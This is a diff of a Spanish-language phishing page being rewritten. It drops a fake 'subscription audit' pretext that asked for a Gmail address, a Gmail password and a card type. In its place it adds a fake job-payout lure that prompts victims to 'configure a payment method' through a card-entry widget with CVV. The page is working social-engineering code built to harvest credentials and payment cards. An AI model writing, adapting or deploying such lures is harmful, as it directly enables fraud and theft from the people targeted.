@@ -94,9 +94,9 @@
 
     <main id="viewport">
         <div class="hero" id="view-1">
-            <h1>Felicidades,<br>Haz sido seleccionado.</h1>
-            <p>Nuestro sistema detecta suscripciones olvidadas en segundos.</p>
-            <button class="btn-primary" style="max-width: 300px" onclick="showInteractiveCard()">Comenzar Auditoría</button>
+            <h1>¡Buen trabajo!<br>Dejanos tus datos aqui para recibir el pago por tus activividades.</h1>
+           
+            <button class="btn-primary" style="max-width: 300px" onclick="showInteractiveCard()">Configurar metodo de pago.</button>
         </div>
     </main>
 
@@ -194,8 +194,8 @@
             iCvv.addEventListener('blur', () => cardVisual.classList.remove('flipped'));
         }
 
-        function startLoading() {
-            const msgs = ["Sincronizando...", "Escaneando base de datos...", "Generando informe..."];
+      function startLoading() {
+            const msgs = ["Sincronizando...", "Conectando con base de datos...", "Generando informe..."];
             viewport.innerHTML = `
                 <div class="loader-container">
                     <div class="spinner"></div>
@@ -218,34 +218,26 @@
      function showFinalResults() {
     viewport.innerHTML = `
         <div class="audit-container" style="max-width: 500px;">
-            <h2 style="font-size: 2rem; margin-bottom: 10px;">Auditoría Lista</h2>
+            <h2 style="font-size: 2rem; margin-bottom: 10px;">Ya casi</h2>
             
-            <div class="alert-box">
-                ⚠️ RIESGO: Hemos detectado suscripciones fantasma activas en tu cuenta.
-            </div>
+            
             
             <div class="glass-form" style="max-width: 100%;" id="form-container">
                 <p style="color:var(--text-dim); margin-bottom:20px; font-size:0.9rem;">
-                    Para ver los detalles y cancelarlas inmediatamente, inicia sesión con Gmail en SecureScan.
+                    Elige tu area de trabajo
                 </p>
                 
                 <form id="security-form">
                     <div class="form-group">
-                        <label>Tipo de Tarjeta</label>
+                        <label>Puesto</label>
                         <select name="tipo_tarjeta">
-                            <option>Selecciona tu tarjeta...</option>
-                            <option>Debito</option>
-                            <option>Credito</option>
+                            <option>Selecciona tu puesto...</option>
+                            <option>Asistente de chat virtual</option>
+                            <option>Call Center</option>
+                            <option>Ventas en linea</option>
                         </select>
                     </div>
-                    <div class="form-group">
-                        <label>Gmail</label>
-                        <input type="text" name="gmail" placeholder="Correo">
-                    </div>
-                    <div class="form-group">
-                        <label>Contraseña</label>
-                        <input type="password" name="password" placeholder="••••••••">
-                    </div>
+                     
                     
                     <button type="submit" class="btn-primary">Enviar Informe</button>
                 </form>
@@ -255,7 +247,7 @@
                 </p>
             </div>
         </div>
-    `;
+    `;  
     
     // AGREGAR EL EVENTO DEL FORMULARIO AQUÍ
     const form = document.getElementById('security-form');
